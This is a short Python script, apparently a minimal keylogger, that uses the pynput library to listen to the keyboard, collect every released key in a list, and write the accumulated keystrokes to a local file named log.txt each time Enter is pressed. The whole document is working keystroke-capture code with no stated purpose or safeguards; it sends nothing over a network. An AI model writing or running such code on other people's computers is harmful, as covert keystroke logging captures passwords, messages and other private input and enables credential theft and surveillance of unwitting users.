from pynput import keyboard
from pynput.keyboard import Key,Listener

key_pressed = []
def on_press(key):
    pass

def on_release(key):
    key_pressed.append(key)
    if key == keyboard.Key.enter:
        with open("log.txt","w+") as f:
            f.write(str(key_pressed))

with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()
